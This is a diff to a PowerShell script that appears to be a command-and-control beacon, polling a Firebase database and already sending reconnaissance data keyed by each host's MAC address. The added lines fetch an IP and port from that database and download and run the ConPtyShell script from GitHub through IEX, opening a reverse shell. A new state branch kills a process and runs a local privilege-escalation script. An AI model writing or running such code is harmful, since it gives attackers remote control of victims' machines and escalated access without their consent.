@@ -42,6 +42,19 @@ while ($true) {
         } | ConvertTo-Json
 
         Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/recon.json') -Method PUT -Body $recon | Out-Null
+
+        $ip = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json"
+        $port = Invoke-RestMethod -Uri "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json"
+        Start-Job {
+            $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/ip.json)"
+            $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/address/port.json)"
+        
+            IEX(
+                IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
+            )
+        
+            Invoke-ConPtyShell "$ip" "$port"
+        } | Out-Null
     }
 
     elseif ($state -eq 1) {
@@ -97,5 +110,15 @@ while ($true) {
         start-sleep -Seconds 5
     }
 
+    elseif ($state -eq 3) {
+        Stop-Process -Id $owningProcesses[$i]
+        C:\temp\beacon\elevate\Elevate.ps1
+        $stateChild = @{
+            "Update" = 1
+        } | ConvertTo-Json
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
+        start-sleep -Seconds 5
+    }
     Start-Sleep -Seconds 5
 }
